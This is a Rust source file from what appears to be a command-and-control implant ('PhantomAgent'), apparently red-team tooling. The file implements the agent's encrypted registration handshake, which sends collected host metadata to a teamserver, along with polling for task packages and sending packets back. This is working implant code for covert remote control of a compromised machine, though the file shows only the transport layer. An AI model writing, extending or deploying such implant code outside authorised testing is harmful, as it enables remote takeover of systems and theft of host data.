//! Agent-level HTTP transport methods: handshake, job polling, and packet send.

use red_cell_common::demon::{DemonCommand, DemonPackage};

use super::PhantomAgent;
use crate::error::PhantomError;
use crate::protocol::{
    build_callback_packet, build_init_packet, callback_ctr_blocks, parse_init_ack,
    parse_job_response,
};

impl PhantomAgent {
    /// Perform the initial registration handshake.
    pub async fn init_handshake(&mut self) -> Result<(), PhantomError> {
        let metadata = self.collect_metadata();
        let packet = build_init_packet(
            self.agent_id,
            &self.raw_crypto,
            &metadata,
            self.config.init_secret_version,
        )?;
        let response = self.transport.send(&packet).await?;
        self.ctr_offset = parse_init_ack(&response, self.agent_id, &self.session_crypto)?;
        Ok(())
    }

    /// Send a `COMMAND_GET_JOB` and return the decrypted task packages.
    ///
    /// The teamserver responds with a raw [`DemonMessage`] byte stream where
    /// each package payload is individually encrypted at successive monotonic
    /// CTR offsets — no outer envelope.
    pub async fn get_job(&mut self) -> Result<Vec<DemonPackage>, PhantomError> {
        let packet = build_callback_packet(
            self.agent_id,
            &self.session_crypto,
            self.ctr_offset,
            self.callback_seq,
            u32::from(DemonCommand::CommandGetJob),
            0,
            &[],
        )?;

        let response = self.transport.send(&packet).await?;
        self.ctr_offset += callback_ctr_blocks(0);
        self.callback_seq += 1;

        let (packages, next_offset) =
            parse_job_response(&self.session_crypto, self.ctr_offset, &response)?;
        self.ctr_offset = next_offset;

        Ok(packages)
    }

    pub(super) async fn send_packet(&self, packet: Vec<u8>) -> Result<(), PhantomError> {
        let _response = self.transport.send(&packet).await?;
        Ok(())
    }
}
